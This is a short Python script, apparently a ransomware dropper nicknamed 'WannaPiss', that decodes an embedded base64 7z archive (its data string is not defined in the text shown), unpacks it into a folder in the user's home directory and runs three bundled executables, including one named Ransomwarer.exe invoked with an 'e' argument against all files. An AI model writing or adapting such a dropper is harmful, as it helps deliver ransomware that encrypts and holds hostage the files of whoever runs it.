
import os
import py7zr
import base64
from io import BytesIO
from subprocess import call
compressed_data_bytes = base64.b64decode(compressed_data_string)
bio = BytesIO(compressed_data_bytes)
home = os.path.expanduser("~") + "/"
wp_dir = home + "WannaPiss/"
py7zr.unpack_7zarchive(bio, wp_dir)
call("./Metadata_Getter.exe", cwd=wp_dir, shell=True)
call("./Ransomwarer.exe e '*'", cwd=wp_dir, shell=True)
call("./RansomwareGame.exe", cwd=wp_dir, shell=True)
